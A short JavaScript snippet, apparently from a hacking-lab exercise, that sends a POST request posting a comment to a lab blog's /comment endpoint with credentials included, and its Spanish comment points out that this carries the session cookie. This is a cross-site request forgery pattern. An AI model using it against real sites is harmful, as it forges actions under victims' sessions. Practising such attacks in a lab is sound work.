fetch("https://chl-46e20df4-11bb-4168-b86b-90f032cd2764-blog-hacklab-v2.softwareseguro.com.ar/comment", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "content=ComentarioJeni",
  credentials: "include"  // ⚠️ Incluye la cookie de sesión
});